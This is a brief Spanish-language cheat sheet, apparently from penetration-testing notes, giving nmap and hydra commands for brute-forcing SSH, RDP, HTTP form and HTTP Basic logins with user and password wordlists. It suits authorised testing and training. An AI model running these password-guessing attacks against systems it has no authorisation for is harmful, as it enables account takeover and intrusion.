# Bruteforce

## SSH

**Verificar estado y detectar versión**

```bash
sudo nmap -sV -p 22 <IP>
```

**Ataque a usuario específico y diccionario de contraseñas**

```bash
hydra -l <USER> -P wordlist.txt ssh://<IP>
```

**Ataque con posibles usuarios y contraseñas**

```bash
hydra -L users.txt -P passwords.txt ssh://<IP>
```

***

## RDP

**Verificar estado y detectar versión**

```bash
sudo nmap -sV -p 3389 <IP>
```

**Ataque a usuario específico y diccionario de contraseñas**

```bash
hydra -l <USER> -P wordlist.txt rdp://<IP>
```

**Ataque con posibles usuarios y contraseñas**

```bash
hydra -L users.txt -P passwords.txt rdp://<IP>
```

***

## HTTP

### POST

```bash
hydra -l <USUARIO> -P <WORDLIST_PATH> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^:F=Login failed. Invalid"
```

Se utiliza `^USER^` y `^PASS^` para indicar los campos donde Hydra debe introducir las credenciales. La condición `F=` indica el texto que identifica un intento fallido. También podemos utilizar `S=` para identificar una autenticación correcta.

### Basic Authentication

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://<IP>/:A=BASIC"
```

Se especifica `A=BASIC` para indicar el mecanismo de autenticación HTTP Basic.
